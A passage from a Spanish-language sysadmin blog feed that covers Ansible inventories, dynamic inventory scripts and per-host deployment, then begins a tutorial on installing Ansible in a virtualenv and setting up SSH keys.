&lt;p&gt;Aunque las máquinas y las redes asignadas a cada entorno sean variables, los grupos y funcionalidades son las mismas. Suponiendo que los &lt;em&gt;playbooks&lt;/em&gt; actúen contra los grupos, variando el fichero de &lt;em&gt;hosts&lt;/em&gt; podemos conseguir todos los entornos necesarios.&lt;/p&gt;
&lt;p&gt;De hecho, podemos tener varios ficheros de &lt;em&gt;hosts&lt;/em&gt; y especificarlos por parámetro en el momento de lanzar &lt;strong&gt;ansible-playbook&lt;/strong&gt;. Por ejemplo, para el entorno de &lt;em&gt;preproducción&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts-pre
&lt;span class="o"&gt;[&lt;/span&gt;loadbalancer&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.20.0.2

&lt;span class="o"&gt;[&lt;/span&gt;appservers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.20.0.3
&lt;span class="m"&gt;172&lt;/span&gt;.20.0.4

&lt;span class="o"&gt;[&lt;/span&gt;dbservers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.20.0.5
root@ansible:~# ansible-playbook -i hosts-pre --list-hosts setup.yml

playbook: setup.yml

  play &lt;span class="c1"&gt;#1 (loadbalancer): Setup load balancer...        TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;loadbalancer&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;172&lt;/span&gt;.20.0.2

  play &lt;span class="c1"&gt;#2 (appservers): Setup application servers...    TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;appservers&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;172&lt;/span&gt;.20.0.3
      &lt;span class="m"&gt;172&lt;/span&gt;.20.0.4

  play &lt;span class="c1"&gt;#3 (dbservers): Setup database servers...        TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;dbservers&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;172&lt;/span&gt;.20.0.5
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y casi lo mismo para el entono de &lt;em&gt;producción&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts-pro
&lt;span class="o"&gt;[&lt;/span&gt;loadbalancer&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2

&lt;span class="o"&gt;[&lt;/span&gt;appservers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.6
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.7

&lt;span class="o"&gt;[&lt;/span&gt;dbservers&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.8
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.9
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.10
root@ansible:~# ansible-playbook -i hosts-pro --list-hosts setup.yml

playbook: setup.yml

  play &lt;span class="c1"&gt;#1 (loadbalancer): Setup load balancer...        TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;loadbalancer&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2

  play &lt;span class="c1"&gt;#2 (appservers): Setup application servers...    TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;appservers&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.7
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.6
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3

  play &lt;span class="c1"&gt;#3 (dbservers): Setup database servers...        TAGS: []&lt;/span&gt;
    pattern: &lt;span class="o"&gt;[&lt;/span&gt;u&lt;span class="s1"&gt;&amp;#39;dbservers&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
    hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.9
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.8
      &lt;span class="m"&gt;10&lt;/span&gt;.0.0.10
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Inventario autogenerado&lt;/h2&gt;
&lt;p&gt;A veces nos conviene sacar la lista de &lt;em&gt;hosts&lt;/em&gt; y de &lt;em&gt;grupos&lt;/em&gt; de otro lugar, por ejemplo, de una base de datos corporativa. En estos casos, basta con saber que el fichero &lt;em&gt;hosts&lt;/em&gt; puede ser ejecutable y se espera que devuelva un diccionario JSON de &lt;em&gt;grupos&lt;/em&gt;, cada uno con una lista de los &lt;em&gt;hosts&lt;/em&gt; que lo componen. &lt;strong&gt;Ansible&lt;/strong&gt; va a ejecutar el &lt;em&gt;script&lt;/em&gt; para sacar esa información.&lt;/p&gt;
&lt;p&gt;Vamos a hacer un ejercicio de imaginación: supongamos este &lt;em&gt;script&lt;/em&gt; saca los datos de algún sitio (LDAP, BBDD, una API de nuestra CMDB, ...), y los saca en formato JSON:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts.py
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

import json

&lt;span class="nv"&gt;inventory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;loadbalancer&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.0.0.2&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s1"&gt;&amp;#39;appservers&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.0.0.3&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;10.0.0.4&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
    &lt;span class="s1"&gt;&amp;#39;dbservers&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;10.0.0.5&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
&lt;span class="o"&gt;}&lt;/span&gt;

print json.dumps&lt;span class="o"&gt;(&lt;/span&gt;inventory&lt;span class="o"&gt;)&lt;/span&gt;
root@ansible:~# chmod &lt;span class="m"&gt;755&lt;/span&gt; hosts.py
root@ansible:~# ./hosts.py
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;appservers&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.3&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;10.0.0.4&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;loadbalancer&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.2&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;dbservers&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.5&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]}&lt;/span&gt;
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veamos que es capaz de sacar los grupos que le pidamos de forma fácil:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible -i hosts.py --list-hosts loadbalancer
  hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
root@ansible:~# ansible -i hosts.py --list-hosts appservers
  hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
root@ansible:~# ansible -i hosts.py --list-hosts dbservers
  hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
root@ansible:~# ansible -i hosts.py --list-hosts all
  hosts &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
    &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Desplegar ficheros según el host&lt;/h2&gt;
&lt;p&gt;En los &lt;em&gt;playbooks&lt;/em&gt; podemos usar variables, bien sean de ejecución, o las que indiquemos nosotros. Esto puede jugar a nuestro favor en caso, por ejemplo, de querer desplegar ficheros distintos en cada servidor. Un ejemplo:&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos esta estructura de ficheros, con su fichero de &lt;em&gt;hosts&lt;/em&gt; y su &lt;em&gt;playbook&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~/multiple_webservers# tree
.
├── hosts
├── playbook.yml
└── webs
    ├── server1
    │   ├── index.html
    │   └── sitemap.xml
    └── server2
        ├── adminer.php
        └── index.php

&lt;span class="m"&gt;3&lt;/span&gt; directories, &lt;span class="m"&gt;6&lt;/span&gt; files
root@ansible:~/multiple_webservers# cat hosts
&lt;span class="o"&gt;[&lt;/span&gt;webservers&lt;span class="o"&gt;]&lt;/span&gt;
server1
server2
root@ansible:~/multiple_webservers# cat playbook.yml
- hosts: webservers
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - copy: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;webs/&lt;span class="o"&gt;{{&lt;/span&gt; inventory_hostname &lt;span class="o"&gt;}}&lt;/span&gt;/ &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/www/
root@ansible:~/multiple_webservers#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lanzamos el &lt;em&gt;playbook&lt;/em&gt; para aprovisionar los ficheros &lt;em&gt;web&lt;/em&gt; a los servidores:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~/multiple_webservers# ansible-playbook -i hosts playbook.yml

PLAY ***************************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;copy&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;server1&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;server2&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
server1                    : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
server2                    : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~/multiple_webservers#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y fácilmente comprobamos que cada servidor tiene los suyos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~/multiple_webservers# ssh root@server1 ls /var/www/
index.html
sitemap.xml
root@ansible:~/multiple_webservers# ssh root@server2 ls /var/www/
adminer.php
index.php
root@ansible:~/multiple_webservers#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Variables en el inventario&lt;/h2&gt;
&lt;p&gt;Hay algunas variables que dependen de la máquina en la que se ejecutan. Aunque es posible definir estructuras condicionales en los &lt;em&gt;playbooks&lt;/em&gt;, no escala. Para no ensuciar los &lt;em&gt;playbooks&lt;/em&gt;, las podemos definir en el fichero de &lt;em&gt;hosts&lt;/em&gt;. Así pues, cada &lt;em&gt;grupo&lt;/em&gt; puede tener sus propias variables; pueden ser variables "nuestras" o variables que entienda &lt;strong&gt;ansible&lt;/strong&gt;. Como ejemplo, un &lt;em&gt;inventario&lt;/em&gt; con variables de acceso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat hosts
[slaves]
10.0.0.2
10.0.0.3

[slaves:vars]
ansible_user = ansible
ansible_ssh_pass = s3cr3t
ansible_become = true
ansible_become_method = sudo
ansible_become_user = root
ansible_become_pass = s3cr3t
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, y de acuerdo con la &lt;a href="http://docs.ansible.com/ansible/intro_inventory.html#list-of-behavioral-inventory-parameters"&gt;documentación oficial&lt;/a&gt; de &lt;strong&gt;ansible&lt;/strong&gt;, entraríamos con el usuario &lt;em&gt;ansible&lt;/em&gt; para hacer seguidamente &lt;strong&gt;sudo&lt;/strong&gt; para actuar con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible -i hosts -m command -a id slaves
10.0.0.3 | SUCCESS | rc=0 &amp;gt;&amp;gt;
uid=0(root) gid=0(root) grupos=0(root)

10.0.0.2 | SUCCESS | rc=0 &amp;gt;&amp;gt;
uid=0(root) gid=0(root) grupos=0(root)

root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;</content><category term="ansible"></category><category term="playbook"></category></entry><entry><title>Instalando ansible para gestionar servidores</title><link href="https://www.linuxsysadmin.ml/2016/04/instalando-ansible-para-gestionar-servidores.html" rel="alternate"></link><published>2016-04-11T08:00:00+02:00</published><updated>2016-04-11T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-04-11:/2016/04/instalando-ansible-para-gestionar-servidores.html</id><summary type="html">&lt;p&gt;Cuando nos encontramos delante de servidores únicos, es bastante fácil su gestión. Sin embargo, cuando tenemos 8 instancias de cada tipo de servidor, las tareas se vuelven lentas y repetitivas. Podemos incluso automatizar la gestión de una sola máquina para hacer su entorno fácilmente reproducible, en vistas a su reconstrucción …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando nos encontramos delante de servidores únicos, es bastante fácil su gestión. Sin embargo, cuando tenemos 8 instancias de cada tipo de servidor, las tareas se vuelven lentas y repetitivas. Podemos incluso automatizar la gestión de una sola máquina para hacer su entorno fácilmente reproducible, en vistas a su reconstrucción.&lt;/p&gt;
&lt;p&gt;Para ello existen algunas herramientas capaces de modificar los servidores, sea mediante un protocolo de &lt;strong&gt;pull&lt;/strong&gt; (&lt;strong&gt;puppet&lt;/strong&gt;, &lt;strong&gt;chef&lt;/strong&gt;) que tienen agentes capaces de pedir a un servidor central las reglas a aplicarse, o mediante un protocolo de &lt;strong&gt;push&lt;/strong&gt; (&lt;strong&gt;fabric&lt;/strong&gt;, &lt;strong&gt;ansible&lt;/strong&gt;) que simplemente son formas de enviar esas órdenes desde el servidor central.&lt;/p&gt;
&lt;p&gt;Hoy vamos a instalar &lt;strong&gt;ansible&lt;/strong&gt;, herramienta que considero muy interesante por su simplicidad; carece de agentes activos, funcionando como un conjunto de &lt;em&gt;scripts&lt;/em&gt; en una máquina cualquiera que actúa de servidor y utilizando el protocolo &lt;strong&gt;SSH&lt;/strong&gt; para empujar los &lt;em&gt;scripts&lt;/em&gt;, que se ejecutan con un &lt;strong&gt;python&lt;/strong&gt; en el servidor destino.&lt;/p&gt;
&lt;p&gt;Si estuviéramos en una máquina tipo &lt;strong&gt;Debian&lt;/strong&gt;/&lt;strong&gt;Ubuntu&lt;/strong&gt;, la instalación es tan fácil como lanzar &lt;strong&gt;apt-get&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~$ apt-get install ansible
...  
root@server:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin embargo, instalarlo a nivel de sistema es un problema en algunos entornos, así que podemos instalarlo en una carpeta local, concretamente en un &lt;strong&gt;virtualenv&lt;/strong&gt; dedicado en nuestra carpeta personal. Esta es la forma que se explica en este tutorial.&lt;/p&gt;
&lt;p&gt;Empezaremos con un servidor cualquiera; al no tener agentes activos y ser &lt;em&gt;scripts&lt;/em&gt;, nos vale cualquiera. En este caso se ha usado una máquina tipo &lt;strong&gt;RedHat&lt;/strong&gt;. Realmente no nos importa demasiado la versión de &lt;strong&gt;python&lt;/strong&gt; que utilice.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat /etc/redhat-release
Red Hat Enterprise Linux Server release &lt;span class="m"&gt;6&lt;/span&gt;.7 &lt;span class="o"&gt;(&lt;/span&gt;Santiago&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.6.6
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creación del virtualenv con ansible&lt;/h2&gt;
&lt;p&gt;Vamos a construir el &lt;strong&gt;virtualenv&lt;/strong&gt; desde cero. Si nos interesara hacerlo en otra máquina en la que tengamos permisos para instalar paquetes, bastaría con copiar la carpeta del &lt;strong&gt;virtualenv&lt;/strong&gt; en el mismo sitio, y sin instalar nada mas.&lt;/p&gt;
&lt;p&gt;Las únicas dependencias que se necesitan para construir el &lt;strong&gt;virtualenv&lt;/strong&gt; es &lt;strong&gt;python&lt;/strong&gt;, &lt;strong&gt;gcc&lt;/strong&gt; y &lt;strong&gt;python-devel&lt;/strong&gt; (o &lt;strong&gt;python-dev&lt;/strong&gt; si se tratara de una máquina tipo &lt;strong&gt;Debian&lt;/strong&gt;/&lt;strong&gt;Ubuntu&lt;/strong&gt;). Como ya tenemos &lt;strong&gt;gcc&lt;/strong&gt; y &lt;strong&gt;python&lt;/strong&gt;, instalamos solamente &lt;strong&gt;python-devel&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@toolbox:~$ sudo yum install python-devel
Loaded plugins: product-id, subscription-manager
This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.
Setting up Install Process
...
Installed:
  python-devel.x86_64 &lt;span class="m"&gt;0&lt;/span&gt;:2.6.6-64.el6

Complete!
gerard@toolbox:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para no instalar nada innecesario en la máquina, vamos a descargar el comando &lt;em&gt;virtualenv&lt;/em&gt;, que va a cumplir su función y va a ser eliminado. Lo descargamos y lo descomprimimos, en cualquier carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ wget https://pypi.python.org/packages/source/v/virtualenv/virtualenv-15.0.1.tar.gz
--2016-04-05 &lt;span class="m"&gt;11&lt;/span&gt;:54:27--  https://pypi.python.org/packages/source/v/virtualenv/virtualenv-15.0.1.tar.gz
Resolving pypi.python.org... &lt;span class="m"&gt;23&lt;/span&gt;.235.43.223
Connecting to pypi.python.org&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;23&lt;/span&gt;.235.43.223&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: &lt;span class="m"&gt;1842776&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.8M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Saving to: “virtualenv-15.0.1.tar.gz”

&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[========================================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;,842,776   &lt;span class="m"&gt;2&lt;/span&gt;.90M/s   in &lt;span class="m"&gt;0&lt;/span&gt;.6s

&lt;span class="m"&gt;2016&lt;/span&gt;-04-05 &lt;span class="m"&gt;11&lt;/span&gt;:54:28 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.90 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - “virtualenv-15.0.1.tar.gz” saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1842776&lt;/span&gt;/1842776&lt;span class="o"&gt;]&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ tar xzf virtualenv-15.0.1.tar.gz
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Utilizamos el comando &lt;em&gt;virtualenv&lt;/em&gt; para generar la estructura contenedora, de la misma manera que otros &lt;em&gt;virtualenv&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ ./virtualenv-15.0.1/virtualenv.py ansible
New python executable in /home/gerard/ansible/bin/python
Installing setuptools, pip, wheel...done.
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hacemos limpieza de &lt;strong&gt;virtualenv&lt;/strong&gt;, que ya no vamos a necesitar mas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ rm -R virtualenv-15.0.1*
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La instalación es la misma que haríamos con cualquier módulo de &lt;strong&gt;python&lt;/strong&gt;, con la excepción que va a generar fichero &lt;em&gt;.so&lt;/em&gt;, dependientes de la arquitectura del procesador que los genere. Si movéis el &lt;strong&gt;virtualenv&lt;/strong&gt;, tened esto en cuenta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="nb"&gt;source&lt;/span&gt; ansible/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;ansible&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ pip install ansible
DEPRECATION: Python &lt;span class="m"&gt;2&lt;/span&gt;.6 is no longer supported by the Python core team, please upgrade your Python. A future version of pip will drop support &lt;span class="k"&gt;for&lt;/span&gt; Python &lt;span class="m"&gt;2&lt;/span&gt;.6
Collecting ansible
...
Installing collected packages: ecdsa, pycrypto, paramiko, MarkupSafe, jinja2, PyYAML, ansible
Successfully installed MarkupSafe-0.23 PyYAML-3.11 ansible-2.0.1.0 ecdsa-0.13 jinja2-2.8 paramiko-1.16.0 pycrypto-2.6.1
&lt;span class="o"&gt;(&lt;/span&gt;ansible&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ deactivate
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Controlando nuestro primer esclavo&lt;/h2&gt;
&lt;p&gt;Vamos a habilitar una máquina cualquiera como receptora de &lt;strong&gt;ansible&lt;/strong&gt;. Los puntos básicos a tener en cuenta es que vamos a habilitar &lt;strong&gt;SSH&lt;/strong&gt; por claves (sin contraseña) y debemos asegurar que la máquina destino tiene un &lt;strong&gt;python&lt;/strong&gt; instalado.&lt;/p&gt;
&lt;p&gt;Empezaremos generando las claves privada y pública en la máquina controladora. Esto se hace mediante el comando &lt;em&gt;ssh-keygen&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key &lt;span class="o"&gt;(&lt;/span&gt;/home/gerard/.ssh/id_rsa&lt;span class="o"&gt;)&lt;/span&gt;:
Created directory &lt;span class="s1"&gt;&amp;#39;/home/gerard/.ssh&amp;#39;&lt;/span&gt;.
Enter passphrase &lt;span class="o"&gt;(&lt;/span&gt;empty &lt;span class="k"&gt;for&lt;/span&gt; no passphrase&lt;span class="o"&gt;)&lt;/span&gt;:
Enter same passphrase again:
Your identification has been saved in /home/gerard/.ssh/id_rsa.
Your public key has been saved in /home/gerard/.ssh/id_rsa.pub.
The key fingerprint is:
8e:74:f9:49:70:ba:15:d0:93:ff:88:5a:6a:f5:ad:cd gerard@toolbox
The key&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s randomart image is:
